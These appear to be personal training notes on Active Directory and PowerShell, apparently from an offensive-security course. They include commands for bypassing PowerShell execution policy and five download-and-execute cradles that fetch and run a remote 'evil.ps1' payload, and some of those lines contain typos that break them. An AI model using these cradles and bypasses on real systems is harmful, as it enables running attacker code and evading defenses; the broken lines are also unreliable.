### Active Directory
![[Pasted image 20210705173121.png]]
![[Pasted image 20210705173153.png]]
**Active Directory** (**AD**) is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server operating system as a set of processes and services. Initially, Active Directory was used only for centralized domain management. However, Active Directory eventually became an umbrella title for a broad range of directory-based identity-related services.

![[Pasted image 20210705173305.png]]
![[Pasted image 20210705173352.png]]

### Powershell

![[Pasted image 20210705173602.png]]

![[Pasted image 20210705173752.png]]

```powershell
# Lists everything about help topics
Get-Help *

# Lists every which consits the word process
Get-Help process

# Update the help systems (v3+)
Update-Help
```

![[Pasted image 20210705173807.png]]

```powershell
# Lists full help about a topic (Get-Item cmdlet in this case)
Get-Help Get-Item -Full

# Lists examples how to run a cmdlet (Get-Item cmdlet in this case)
Get-Help Get-Item -Examples
```

### Poweshell Cmdlets
![[Pasted image 20210705173822.png]]

![[Pasted image 20210705173846.png]]
```powershell
# Use the below commands for listing all cmdlets
Get-Command -CommandType cmdlet

# List processes in the system
Get-Process
```

##### Bypassing execution policy
![[Pasted image 20210705173957.png]]
```powershell
powershell -ExecutionPolicy bypass

powershell -c <cmd>

powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"
```

![[Pasted image 20210705174124.png]]
```powershell
# A module can be imported as
Import-Module <modulepath>

# All the command in the module can be listed with
Get-Command -Module <modulename>
```

### Download and execute
![[Pasted image 20210705174151.png]]
```powershell
# Method 1
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

# Method 2
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://webserver/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex response

# Method 3 PSv3 onwards
iex (iwr 'http://webserver/evil.ps1')

# Method 4
$h=New-Object -ComObject Msxml12.XMLHTTP;$h.open('GET','http://webserver/evil.ps1',$false);$h.send();iex $.responseText

# Method 5
$wr = [System.NET.WebRequest]::Create("http://webserver/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```